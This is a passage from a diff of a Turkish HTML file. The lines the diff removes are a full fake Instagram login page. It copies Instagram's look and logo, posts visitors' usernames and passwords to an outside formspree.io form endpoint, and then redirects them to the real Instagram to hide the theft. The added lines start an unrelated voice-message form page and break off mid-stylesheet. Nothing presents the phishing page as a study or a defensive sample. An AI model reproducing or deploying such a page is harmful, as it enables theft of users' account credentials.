@@ -2,99 +2,30 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Giriş</title>
-    <style>
-        /* Genel Stil */
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #fafafa;
-            margin: 0;
-            padding: 0;
-        }
-
-        /* Giriş Sayfası Container'ı */
-        .login-container {
-            width: 350px;
-            margin: 100px auto;
-            background-color: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-
-        /* Instagram Logosu */
-        .logo {
-            width: 150px;
-            margin-bottom: 30px;
-        }
-
-        /* Giriş Formu */
-        input {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 14px;
-        }
-
-        input[type="submit"] {
-            background-color: #0095f6;
-            color: white;
-            cursor: pointer;
-        }
-
-        input[type="submit"]:hover {
-            background-color: #006db3;
-        }
-
-        /* Alt metin */
-        .footer {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #8e8e8e;
-        }
-
-        .footer a {
-            text-decoration: none;
-            color: #0095f6;
-        }
-
-        .footer p {
-            margin: 10px 0;
-        }
-    </style>
-</head>
-<body>
-
-    <!-- Giriş Sayfası -->
-    <div class="login-container">
-        <!-- Instagram Logosu -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1024px-Instagram_logo_2022.svg.png" alt="Instagram Logo" class="logo">
-
-        <!-- Giriş Formu -->
-        <form action="https://formspree.io/f/meogvayz" method="POST" id="loginForm">
-            <input type="text" name="kullaniciAdi" placeholder="Telefon, kullanıcı adı veya e-posta" required><br>
-            <input type="password" name="sifre" placeholder="Şifre" required><br>
-            <input type="submit" value="Giriş Yap">
-        </form>
-
-        <!-- Parola unuttum ve diğer bağlantılar -->
-        <div class="footer">
-            <p><a href="#">Parolanızı mı unuttunuz?</a></p>
-            <p><a href="#">Hesap oluştur</a></p>
-        </div>
-    </div>
-
-    <script>
-        // Form gönderildikten sonra Instagram'a yönlendirme işlemi
-        document.getElementById('loginForm').onsubmit = function(event) {
-            // Sayfa yenilenmesinin engellenmesi
-            event.preventDefault();
-
-            // Form verilerini işlemek isterseniz, burada yapılabilir
-            // Ardından Instagram'a yönlendirme
-            window.location.href = "https
+  <meta charset="UTF-8" />
+  <title>Form Gönderme - Sesli Mesaj</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f7f7f7;
+      padding: 20px;
+      text-align: center;
+    }
+    form {
+      margin-bottom: 20px;
+    }
+    input[type="text"], input[type="email"] {
+      padding: 10px;
+      width: 250px;
+      margin: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      padding: 10px 20px;
+      background: #28a745;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
